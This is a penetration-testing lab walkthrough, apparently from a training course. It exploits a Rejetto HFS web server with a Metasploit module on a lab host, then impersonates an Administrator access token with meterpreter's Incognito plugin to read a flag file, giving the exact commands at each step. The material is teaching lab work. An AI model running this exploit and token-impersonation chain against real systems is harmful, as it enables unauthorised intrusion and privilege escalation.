Privilege escalation is a critical phase in penetration testing where the tester aims to gain elevated access to resources that are normally protected from an application or user. This process involves exploiting vulnerabilities to increase the level of access. In this lab, we will learn about the process of impersonating access tokens on Windows with meterpreter's in-built Incognito module.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Escalate the privilege on a Windows machine.

# Tools

- Nmap
- Metasploit Framework

_______
**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/93a4fda3c08d90c326d23c83ede8fbb6b114d0be1db9065dc4ce831287d71150.jpg)

**Step 2:** Run an Nmap scan against the target.

**Command:**

```
nmap demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/a38fb22c7bcf3d4efc7dafcfab8f8e09a1c457c6f9a78552125ef42dc25781f3.jpg)

**Step 3:** We have discovered that multiple ports are open. We will run nmap again to determine version information on port 80.

**Command:**

```
nmap -sV -p 80 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/8047231d2d04f88cd456a95d17ecc2e827f9af21c5fe0fb10b08af80fe0480d6.jpg)

**Step 4:** We will search the exploit module for hfs 2.3 using searchsploit.

**Command:**

```
searchsploit hfs
```

![Content Image](https://assets.ine.com/lab/learningpath/5a9da9b04909bfe8212d584fe3b9bc6db33e392338e79a607baee4a4d7c0985b.jpg)

**Step 5:** There is a Metasploit module for hfs server. We will use the Metasploit module to exploit the target.

**Commands:**

```
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit 
getuid 
```

![Content Image](https://assets.ine.com/lab/learningpath/f78480086c97d8f512baaf643c49e4167157fe87de8c3775ef1aa4d4ca4dbf75.jpg)

We have successfully exploited a hfs server and we are running as a local service.

**Step 6:** Trying to read the flag, which is located in C:\Users\Administrator\Desktop\flag.txt

**Command:**

```
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/2e52777701ff3a76099b40b836f7dbcfba9488bafe1e1557e60c50a60c03baf1.jpg)

**Step 7:** We cannot read the flag with current privilege. The flag is located into the Administrator’s Desktop folder. Load incognito plugin and check all available tokens.

**Command:**

```
load incognito
list_tokens -u
```

![Content Image](https://assets.ine.com/lab/learningpath/9eade6f518262934a2303367ad2847f716da7d2d07e18c69d9b610e18bc85b54.jpg)

**Step 8:** We can notice that the Administrator user token is available. Impersonate the Administrator user token and read the flag.

**Command:**

```
impersonate_token ATTACKDEFENSE\\Administrator 
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/114492104032c22104c17a49443e8eca818b4dcc228b5aba3ac701674f862f23.jpg)

This revealed the flag to us:

Flag: x28c832a39730b7d46d6c38f1ea18e12

# Conclusion

In this lab, we learned about the process of impersonating access tokens on Windows with meterpreter's in-built Incognito module.